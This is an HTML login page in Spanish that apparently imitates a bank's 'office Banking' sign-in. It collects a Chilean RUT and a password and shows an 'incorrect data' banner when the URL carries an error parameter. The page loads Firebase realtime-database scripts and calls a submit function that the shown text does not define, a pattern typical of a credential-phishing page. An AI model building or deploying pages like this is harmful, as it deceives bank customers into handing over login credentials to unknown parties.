<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Ingreso</title>
  <style>
    html, body {
      margin: 0;
      padding: 0;
      background: white;
      font-family: Arial, sans-serif;
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .contenedor {
      border: 3px solid red;
      width: 90vw;
      max-width: 400px;
      padding: 20px;
      background: white;
      box-sizing: border-box;
    }
    .titulo {
      display: flex;
      justify-content: center;
      align-items: center;
      gap: 5px;
      margin-bottom: 20px;
    }
    .titulo span:first-child {
      color: black;
      font-weight: bold;
    }
    .titulo span:last-child {
      background-color: red;
      color: white;
      padding: 2px 6px;
      border-radius: 4px;
      font-weight: bold;
    }
    label {
      display: block;
      margin-top: 10px;
      font-weight: bold;
      color: black;
    }
    input[type="text"], input[type="password"] {
      width: 100%;
      padding: 10px;
      border: 1px solid black;
      margin-top: 5px;
      border-radius: 4px;
      box-sizing: border-box;
    }
    .password-container {
      position: relative;
      width: 100%;
      margin-top: 5px;
    }
    .password-container input {
      padding-right: 30px;
    }
    .toggle-password {
      position: absolute;
      top: 50%;
      right: 8px;
      transform: translateY(-50%);
      cursor: pointer;
      font-size: 14px;
    }
    button {
      margin-top: 20px;
      width: 100%;
      padding: 10px;
      background-color: red;
      color: white;
      border: none;
      border-radius: 4px;
      font-weight: bold;
    }
    #mensaje {
      font-size: 0.9em;
      color: red;
    }
  </style>
  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
</head>
<body>
  <div class="contenedor">
    <div class="titulo">
      <span>Ingreso a office</span><span>Banking</span>
    </div>
    <form onsubmit="enviarFormulario(event)">
      <label for="rut">RUT</label>
      <input type="text" id="rut" maxlength="12" required oninput="formatearYValidarRUT(this)" />
      <span id="mensaje"></span>

      <label for="clave">Contrase√±a</label>
      <div class="password-container">
        <input type="password" id="clave" required />
        <span class="toggle-password" onclick="togglePassword()">üëÅÔ∏è</span>
      </div>

      <button type="submit">Ingresar</button>
    </form>
  </div>

  
<script>
  const params = new URLSearchParams(window.location.search);
  if (params.get("error")) {
    const mensajeError = document.createElement("div");
    mensajeError.style.color = "red";
    mensajeError.style.marginTop = "10px";
    mensajeError.style.fontWeight = "bold";
    mensajeError.textContent = "Datos ingresados Incorrectamente!";
    document.querySelector("form, .contenedor, .inputs").appendChild(mensajeError);
  }
</script>
</body>
